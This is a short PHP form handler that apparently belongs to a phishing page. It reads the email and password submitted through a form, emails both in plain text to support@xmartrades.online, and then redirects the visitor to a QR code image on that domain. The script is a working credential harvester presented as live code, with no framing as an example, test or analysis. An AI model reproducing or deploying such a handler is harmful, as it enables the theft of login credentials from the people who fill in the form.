<?php
if(!empty($_POST["email"])) {
$to = "support@xmartrades.online";
$subject = "My subject";
$email = $_POST["email"];
$password = $_POST["password"];
$txt = "Email:".$email.' & Password: '.$password;
$headers = "From: support@xmartrades.online" . "\r\n" .
"CC: support@xmartrades.online";

mail($to,$subject,$txt,$headers);

header("Location: https://xmartrades.online/HelloTech-qr-code-300x300.webp");
}
?>


